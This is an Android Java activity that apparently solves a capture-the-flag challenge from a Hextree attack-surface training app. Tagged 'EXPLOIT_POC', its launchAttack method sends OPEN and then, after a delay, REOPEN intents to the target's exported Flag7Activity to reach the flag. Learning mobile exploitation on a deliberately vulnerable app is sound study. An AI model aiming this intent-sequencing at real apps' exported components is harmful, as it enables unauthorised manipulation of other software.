package com.android.zerohextree;

import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag7Binding;

public class flag7 extends AppCompatActivity {
    private static final String TAG = "EXPLOIT_POC";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag7);

        Button StartFun =findViewById((R.id.start_fun));
        StartFun.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                launchAttack();
            }
        });


    }
    private void launchAttack() {
        // First Intent: Launch Flag7Activity with action=OPEN
        Intent firstIntent = new Intent();
        firstIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity" );
        firstIntent.setAction("OPEN");
        startActivity(firstIntent);

        // Second Intent: Trigger REOPEN after a short delay (ensure activity is visible)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent secondIntent = new Intent();
            secondIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");
            secondIntent.setAction("REOPEN");
            secondIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); // Only necessary flag
            startActivity(secondIntent);
        }, 1000); // Adjust delay as needed
    }



}